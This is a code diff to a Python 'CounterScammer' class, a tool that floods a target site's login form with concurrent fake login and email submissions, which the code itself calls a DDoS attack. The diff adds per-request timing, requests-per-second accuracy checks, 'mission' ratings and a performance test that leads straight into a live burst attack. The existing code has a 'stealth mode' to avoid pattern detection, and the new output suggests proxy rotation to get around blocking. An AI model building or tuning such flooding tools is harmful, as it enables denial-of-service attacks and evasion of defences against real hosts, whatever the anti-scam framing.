@@ -511,10 +511,12 @@ class CounterScammer:
         def execute_request_burst(batch_requests, batch_num):
             """Execute a burst of concurrent requests."""
             batch_results = []
+            batch_start_timestamp = time.time()
             
             def send_single_request(request_info, request_index):
                 try:
                     form_data = request_info['form_data']
+                    request_start_time = time.time()
                     
                     # Add some randomization to avoid pattern detection
                     if self.stealth_mode:
@@ -522,13 +524,16 @@ class CounterScammer:
                         time.sleep(delay)
                     
                     response = self.send_request(form_data)
+                    request_end_time = time.time()
                     
                     return {
                         'index': request_index,
                         'response': response,
                         'success': response.status_code == 200,
                         'form_data': form_data,
-                        'size': len(response.content) if response.content else 0
+                        'size': len(response.content) if response.content else 0,
+                        'request_time': request_end_time - request_start_time,
+                        'timestamp': request_end_time
                     }
                 except Exception as e:
                     return {
@@ -537,7 +542,9 @@ class CounterScammer:
                         'success': False,
                         'form_data': request_info['form_data'],
                         'error': str(e),
-                        'size': 0
+                        'size': 0,
+                        'request_time': 0,
+                        'timestamp': time.time()
                     }
             
             # Use ThreadPoolExecutor for maximum concurrency
@@ -548,17 +555,37 @@ class CounterScammer:
                     for i, req in enumerate(batch_requests)
                 }
                 
+                completed_count = 0
                 for future in as_completed(future_to_request):
                     result = future.result()
                     batch_results.append(result)
+                    completed_count += 1
                     
                     if show_progress and result['success']:
                         form_data = result['form_data']
-                        print(f"💥 [{len(batch_results)}/{len(batch_requests)}] {form_data['login']} - {form_data['email']}")
+                        # Calculate elapsed time and current RPS
+                        elapsed = result['timestamp'] - batch_start_timestamp
+                        current_rps = completed_count / elapsed if elapsed > 0 else 0
+                        
+                        print(f"💥 [{completed_count}/{len(batch_requests)}] "
+                              f"{form_data['login']} - {form_data['email']} "
+                              f"| ⏱️ {elapsed:.2f}s | ⚡ {current_rps:.1f} RPS | "
+                              f"🌐 {result['request_time']*1000:.0f}ms")
             
-            return batch_results
+            batch_end_timestamp = time.time()
+            batch_duration = batch_end_timestamp - batch_start_timestamp
+            batch_rps = len(batch_requests) / batch_duration if batch_duration > 0 else 0
+            
+            # Display batch summary
+            if show_progress:
+                print(f"📊 Batch {batch_num + 1} Summary: "
+                      f"{len(batch_requests)} requests in {batch_duration:.2f}s "
+                      f"= {batch_rps:.1f} RPS")
+            
+            return batch_results, batch_duration, batch_rps
         
         # Execute attack in batches (1 second intervals)
+        batch_timings = []
         for batch_num in range(duration):
             batch_start_time = time.time()
             
@@ -571,10 +598,18 @@ class CounterScammer:
                 break
             
             if show_progress:
+                elapsed_total = batch_start_time - self.stats['start_time']
                 print(f"\n⚡ Batch {batch_num + 1}/{duration}: Launching {len(batch_requests)} concurrent attacks...")
+                print(f"⏰ Total elapsed: {elapsed_total:.2f}s | Target interval: {batch_num + 1}s")
             
             # Execute the batch
-            batch_results = execute_request_burst(batch_requests, batch_num)
+            batch_results, batch_duration, batch_rps = execute_request_burst(batch_requests, batch_num)
+            batch_timings.append({
+                'batch_num': batch_num + 1,
+                'duration': batch_duration,
+                'rps': batch_rps,
+                'requests': len(batch_requests)
+            })
             
             # Process results
             for result in batch_results:
@@ -586,10 +621,27 @@ class CounterScammer:
                 else:
                     failed_requests += 1
             
+            # RPS verification output
+            if show_progress:
+                avg_rps = sum(b['rps'] for b in batch_timings) / len(batch_timings)
+                print(f"📈 Batch RPS: {batch_rps:.1f} | Average RPS: {avg_rps:.1f} | Target: {rps}")
+                
+                # Show timing accuracy
+                timing_accuracy = (batch_rps / rps) * 100 if rps > 0 else 0
+                if timing_accuracy >= 90:
+                    accuracy_indicator = "🟢 EXCELLENT"
+                elif timing_accuracy >= 75:
+                    accuracy_indicator = "🟡 GOOD"
+                else:
+                    accuracy_indicator = "🔴 NEEDS OPTIMIZATION"
+                print(f"🎯 Timing accuracy: {timing_accuracy:.1f}% {accuracy_indicator}")
+            
             # Maintain timing (but don't wait too long)
             batch_elapsed = time.time() - batch_start_time
             if batch_elapsed < 1.0 and batch_num < duration - 1:
                 sleep_time = min(0.8, 1.0 - batch_elapsed)  # Cap sleep time
+                if show_progress:
+                    print(f"⏸️  Waiting {sleep_time:.2f}s to maintain timing...")
                 time.sleep(sleep_time)
         
         self.stats['end_time'] = time.time()
@@ -605,9 +657,12 @@ class CounterScammer:
             'total_time': total_time,
             'actual_rps': actual_rps,
             'target_rps': rps,
+            'rps_accuracy': (actual_rps / rps) * 100 if rps > 0 else 0,
             'bytes_sent': self.stats['bytes_sent'],
             'bytes_received': bytes_transferred,
             'total_bandwidth': self.stats['bytes_sent'] + bytes_transferred,
+            'batch_timings': batch_timings,
+            'avg_batch_rps': sum(b['rps'] for b in batch_timings) / len(batch_timings) if batch_timings else 0,
             'responses': responses[:10]  # Keep only first 10 responses for analysis
         }
         
@@ -617,34 +672,107 @@ class CounterScammer:
         return attack_stats
     
     def _display_attack_summary(self, stats: Dict):
-        """Display professional attack summary."""
-        print(f"\n{'='*60}")
-        print(f"🎯 DDOS ATTACK COMPLETED")
-        print(f"{'='*60}")
-        print(f"📊 Requests sent: {stats['total_requests']:,}")
+        """Display professional attack summary with detailed timing analysis."""
+        print(f"\n{'='*80}")
+        print(f"🎯 DDOS ATTACK COMPLETED - PERFORMANCE ANALYSIS")
+        print(f"{'='*80}")
+        
+        # Basic statistics
+        print(f"📊 Total requests: {stats['total_requests']:,}")
         print(f"✅ Successful: {stats['successful_requests']:,} ({stats['success_rate']:.1f}%)")
         print(f"❌ Failed: {stats['failed_requests']:,}")
-        print(f"⏱️  Duration: {stats['total_time']:.2f} seconds")
-        print(f"⚡ Actual RPS: {stats['actual_rps']:.1f} req/s")
-        print(f"🎯 Target RPS: {stats['target_rps']} req/s")
-        print(f"📤 Data sent: {stats['bytes_sent']:,} bytes ({stats['bytes_sent']/1024/1024:.2f} MB)")
-        print(f"📥 Data received: {stats['bytes_received']:,} bytes ({stats['bytes_received']/1024/1024:.2f} MB)")
-        print(f"🌐 Total bandwidth: {stats['total_bandwidth']:,} bytes ({stats['total_bandwidth']/1024/1024:.2f} MB)")
-        print(f"{'='*60}")
+        print(f"⏱️  Total duration: {stats['total_time']:.2f} seconds")
         
-        # Performance rating
-        efficiency = min(100, (stats['actual_rps'] / stats['target_rps']) * 100)
-        if efficiency >= 90:
-            rating = "🔥 EXCELLENT"
-        elif efficiency >= 75:
-            rating = "👍 GOOD"
-        elif efficiency >= 50:
-            rating = "⚠️  FAIR"
+        # RPS Analysis
+        print(f"\n📈 RPS PERFORMANCE ANALYSIS:")
+        print(f"   🎯 Target RPS: {stats['target_rps']} req/s")
+        print(f"   ⚡ Actual RPS (overall): {stats['actual_rps']:.1f} req/s")
+        print(f"   📊 Average batch RPS: {stats['avg_batch_rps']:.1f} req/s")
+        print(f"   🎯 RPS accuracy: {stats['rps_accuracy']:.1f}%")
+        
+        # RPS accuracy indicator
+        if stats['rps_accuracy'] >= 90:
+            rps_indicator = "🟢 EXCELLENT - Target achieved!"
+        elif stats['rps_accuracy'] >= 75:
+            rps_indicator = "🟡 GOOD - Close to target"
+        elif stats['rps_accuracy'] >= 50:
+            rps_indicator = "🟠 FAIR - Needs optimization"
         else:
-            rating = "❌ POOR"
+            rps_indicator = "🔴 POOR - Significant bottleneck"
+        print(f"   Status: {rps_indicator}")
         
-        print(f"🏆 Attack efficiency: {efficiency:.1f}% - {rating}")
-        print(f"{'='*60}")
+        # Batch timing analysis
+        if 'batch_timings' in stats and stats['batch_timings']:
+            print(f"\n⏰ BATCH TIMING BREAKDOWN:")
+            for batch in stats['batch_timings'][:5]:  # Show first 5 batches
+                accuracy = (batch['rps'] / stats['target_rps']) * 100 if stats['target_rps'] > 0 else 0
+                print(f"   Batch {batch['batch_num']}: {batch['requests']} req in {batch['duration']:.2f}s "
+                      f"= {batch['rps']:.1f} RPS ({accuracy:.1f}% accuracy)")
+            
+            if len(stats['batch_timings']) > 5:
+                print(f"   ... and {len(stats['batch_timings']) - 5} more batches")
+            
+            # Timing consistency analysis
+            rps_values = [b['rps'] for b in stats['batch_timings']]
+            min_rps = min(rps_values)
+            max_rps = max(rps_values)
+            rps_variance = max_rps - min_rps
+            
+            print(f"\n📏 CONSISTENCY ANALYSIS:")
+            print(f"   🔻 Lowest batch RPS: {min_rps:.1f}")
+            print(f"   🔺 Highest batch RPS: {max_rps:.1f}")
+            print(f"   📊 RPS variance: {rps_variance:.1f}")
+            
+            if rps_variance < stats['target_rps'] * 0.1:
+                consistency = "🟢 EXCELLENT - Very consistent"
+            elif rps_variance < stats['target_rps'] * 0.25:
+                consistency = "🟡 GOOD - Fairly consistent"
+            else:
+                consistency = "🔴 POOR - High variance"
+            print(f"   Consistency: {consistency}")
+        
+        # Bandwidth analysis
+        print(f"\n� BANDWIDTH USAGE:")
+        print(f"   �📤 Data sent: {stats['bytes_sent']:,} bytes ({stats['bytes_sent']/1024/1024:.2f} MB)")
+        print(f"   📥 Data received: {stats['bytes_received']:,} bytes ({stats['bytes_received']/1024/1024:.2f} MB)")
+        print(f"   🌐 Total bandwidth: {stats['total_bandwidth']:,} bytes ({stats['total_bandwidth']/1024/1024:.2f} MB)")
+        
+        # Performance recommendations
+        print(f"\n💡 PERFORMANCE RECOMMENDATIONS:")
+        if stats['rps_accuracy'] < 75:
+            print(f"   • Consider reducing target RPS or increasing thread pool size")
+            print(f"   • Check network latency and server response times")
+            print(f"   • Optimize request payload size")
+        if stats['success_rate'] < 95:
+            print(f"   • Monitor target server for rate limiting or blocking")
+            print(f"   • Consider using proxy rotation")
+        if stats['rps_accuracy'] >= 90:
+            print(f"   • 🎉 Excellent performance! Target RPS achieved successfully")
+        
+        # Overall performance rating
+        efficiency = min(100, stats['rps_accuracy'])
+        if efficiency >= 90:
+            rating = "🔥 MISSION ACCOMPLISHED"
+        elif efficiency >= 75:
+            rating = "👍 MISSION SUCCESSFUL"
+        elif efficiency >= 50:
+            rating = "⚠️  MISSION PARTIALLY SUCCESSFUL"
+        else:
+            rating = "❌ MISSION NEEDS IMPROVEMENT"
+        
+        print(f"\n🏆 OVERALL MISSION RATING: {efficiency:.1f}% - {rating}")
+        print(f"{'='*80}")
+        
+        # Quick verification summary
+        print(f"\n🔍 QUICK VERIFICATION:")
+        print(f"Target: {stats['target_rps']} RPS → Achieved: {stats['actual_rps']:.1f} RPS")
+        print(f"Expected: {stats['target_rps'] * stats['total_time']:.0f} requests → "
+              f"Actual: {stats['total_requests']} requests")
+        if abs(stats['actual_rps'] - stats['target_rps']) <= stats['target_rps'] * 0.1:
+            print(f"✅ RPS target verification: PASSED")
+        else:
+            print(f"❌ RPS target verification: FAILED")
+        print(f"{'='*80}")
     
     def close_sessions(self):
         """Close all HTTP sessions to clean up resources."""
@@ -769,6 +897,64 @@ class CounterScammer:
             'total_time': total_time,
             'request_times': request_times,
             'actual_rps': len(requests_data) / total_time if total_time > 0 else 0
+        }
+    
+    def test_rps_performance(self, target_rps: int, test_duration: int = 5) -> Dict:
+        """
+        Test RPS performance with a quick benchmark.
+        
+        Args:
+            target_rps (int): Target requests per second to test
+            test_duration (int): Test duration in seconds (default: 5)
+            
+        Returns:
+            Dict: Performance test results
+        """
+        print(f"🧪 PERFORMANCE TEST: Testing {target_rps} RPS capability...")
+        print(f"⏱️  Test duration: {test_duration} seconds")
+        print(f"📊 Total test requests: {target_rps * test_duration}")
+        print("=" * 60)
+        
+        # Run a quick attack to measure performance
+        test_stats = self.perform_ddos_attack(
+            rps=target_rps,
+            duration=test_duration,
+            login_types=['fb', 'google', 'twitter'],
+            show_progress=True
+        )
+        
+        # Performance analysis
+        rps_accuracy = test_stats['rps_accuracy']
+        avg_batch_rps = test_stats['avg_batch_rps']
+        
+        print(f"\n🔬 PERFORMANCE TEST RESULTS:")
+        print(f"Target RPS: {target_rps} | Achieved: {test_stats['actual_rps']:.1f} | Accuracy: {rps_accuracy:.1f}%")
+        
+        # Recommendations based on test
+        if rps_accuracy >= 90:
+            print(f"✅ EXCELLENT: Your system can handle {target_rps} RPS!")
+            recommendation = "You can confidently use this RPS for your attacks."
+        elif rps_accuracy >= 75:
+            print(f"🟡 GOOD: System performs well at {target_rps} RPS with minor variance.")
+            recommendation = "Consider this RPS for sustained attacks."
+        elif rps_accuracy >= 50:
+            print(f"⚠️  FAIR: System struggles to maintain {target_rps} RPS consistently.")
+            recommended_rps = int(target_rps * 0.75)
+            recommendation = f"Try reducing to ~{recommended_rps} RPS for better performance."
+        else:
+            print(f"❌ POOR: System cannot handle {target_rps} RPS effectively.")
+            recommended_rps = int(target_rps * 0.5)
+            recommendation = f"Reduce to ~{recommended_rps} RPS or optimize your setup."
+        
+        print(f"💡 Recommendation: {recommendation}")
+        print("=" * 60)
+        
+        return {
+            'target_rps': target_rps,
+            'achieved_rps': test_stats['actual_rps'],
+            'accuracy': rps_accuracy,
+            'recommendation': recommendation,
+            'can_handle_target': rps_accuracy >= 75
         }
 
 
@@ -928,8 +1114,9 @@ def interactive_counter_attack():
     scammer = CounterScammer(stealth_mode=True)
     
     try:
-        # Attack mode selection
-        print("\n🎯 SELECT ATTACK MODE:")
+        # Main menu selection
+        print("\n🎯 SELECT OPERATION:")
+        print("0 - 🧪 Performance Test (Verify RPS capability)")
         print("1 - 📈 Escalating Attack (Low → High intensity)")
         print("2 - ⚡ Burst Attack (High intensity)")
         print("3 - 🌊 Flood Attack (Sustained high RPS)")
@@ -937,41 +1124,95 @@ def interactive_counter_attack():
         
         while True:
             try:
-                mode = int(input("\nEnter attack mode (1-4): "))
-                if mode in [1, 2, 3, 4]:
+                operation = int(input("\nEnter operation (0-4): "))
+                if operation in [0, 1, 2, 3, 4]:
                     break
                 else:
-                    print("❌ Please enter 1, 2, 3, or 4.")
+                    print("❌ Please enter 0, 1, 2, 3, or 4.")
             except ValueError:
                 print("❌ Please enter a valid number.")
         
-        # Configure attack parameters based on mode
-        if mode == 1:  # Escalating Attack
-            print("\n📈 ESCALATING ATTACK CONFIGURATION")
-            start_rps = int(input("Starting RPS (e.g., 10): "))
-            end_rps = int(input("Ending RPS (e.g., 200): "))
-            duration = int(input("Total duration in seconds (e.g., 30): "))
+        # Performance test option
+        if operation == 0:
+            print("\n🧪 PERFORMANCE TEST MODE")
+            print("This will test your system's capability to achieve target RPS")
             
-            rps_increment = (end_rps - start_rps) // duration
-            attack_plan = [(start_rps + i * rps_increment, 1) for i in range(duration)]
+            while True:
+                try:
+                    test_rps = int(input("Enter RPS to test (e.g., 500): "))
+                    if test_rps > 0:
+                        break
+                    else:
+                        print("❌ Please enter a positive number.")
+                except ValueError:
+                    print("❌ Please enter a valid number.")
             
-        elif mode == 2:  # Burst Attack
-            print("\n⚡ BURST ATTACK CONFIGURATION")
-            rps = int(input("RPS intensity (e.g., 500): "))
-            duration = int(input("Burst duration in seconds (e.g., 10): "))
-            attack_plan = [(rps, duration)]
+            while True:
+                try:
+                    test_duration = int(input("Test duration in seconds (recommended: 5-10): "))
+                    if test_duration > 0:
+                        break
+                    else:
+                        print("❌ Please enter a positive number.")
+                except ValueError:
+                    print("❌ Please enter a valid number.")
             
-        elif mode == 3:  # Flood Attack
-            print("\n🌊 FLOOD ATTACK CONFIGURATION")
-            rps = int(input("Sustained RPS (e.g., 300): "))
-            duration = int(input("Flood duration in seconds (e.g., 60): "))
-            attack_plan = [(rps, duration)]
+            # Run performance test
+            test_results = scammer.test_rps_performance(test_rps, test_duration)
             
-        else:  # Stealth Attack
-            print("\n🎭 STEALTH ATTACK CONFIGURATION")
-            rps = int(input("Low RPS (e.g., 50): "))
-            duration = int(input("Duration in seconds (e.g., 120): "))
-            attack_plan = [(rps, duration)]
+            # Ask if user wants to continue with attack
+            if test_results['can_handle_target']:
+                continue_attack = input(f"\n🚀 Continue with actual attack at {test_rps} RPS? (y/n): ")
+                if continue_attack.lower() != 'y':
+                    print("✅ Performance test completed. Exiting.")
+                    return
+                # Set operation to burst mode for the tested RPS
+                operation = 2
+                mode = 2
+                rps = test_rps
+                duration = int(input("Attack duration in seconds: "))
+                attack_plan = [(rps, duration)]
+            else:
+                recommended_rps = int(test_results['achieved_rps'] * 0.9)
+                continue_attack = input(f"\n⚠️  Use recommended RPS of {recommended_rps} instead? (y/n): ")
+                if continue_attack.lower() == 'y':
+                    operation = 2
+                    mode = 2
+                    rps = recommended_rps
+                    duration = int(input("Attack duration in seconds: "))
+                    attack_plan = [(rps, duration)]
+                else:
+                    print("✅ Performance test completed. Exiting.")
+                    return
+        
+        # Configure attack parameters based on mode (if not already set by performance test)
+        if operation != 0 or 'attack_plan' not in locals():
+            if operation == 1:  # Escalating Attack
+                print("\n📈 ESCALATING ATTACK CONFIGURATION")
+                start_rps = int(input("Starting RPS (e.g., 10): "))
+                end_rps = int(input("Ending RPS (e.g., 200): "))
+                duration = int(input("Total duration in seconds (e.g., 30): "))
+                
+                rps_increment = (end_rps - start_rps) // duration
+                attack_plan = [(start_rps + i * rps_increment, 1) for i in range(duration)]
+                
+            elif operation == 2:  # Burst Attack
+                print("\n⚡ BURST ATTACK CONFIGURATION")
+                rps = int(input("RPS intensity (e.g., 500): "))
+                duration = int(input("Burst duration in seconds (e.g., 10): "))
+                attack_plan = [(rps, duration)]
+                
+            elif operation == 3:  # Flood Attack
+                print("\n🌊 FLOOD ATTACK CONFIGURATION")
+                rps = int(input("Sustained RPS (e.g., 300): "))
+                duration = int(input("Flood duration in seconds (e.g., 60): "))
+                attack_plan = [(rps, duration)]
+                
+            else:  # Stealth Attack
+                print("\n🎭 STEALTH ATTACK CONFIGURATION")
+                rps = int(input("Low RPS (e.g., 50): "))
+                duration = int(input("Duration in seconds (e.g., 120): "))
+                attack_plan = [(rps, duration)]
         
         # Login type selection
         print("\n🎮 SELECT TARGET LOGIN TYPES:")
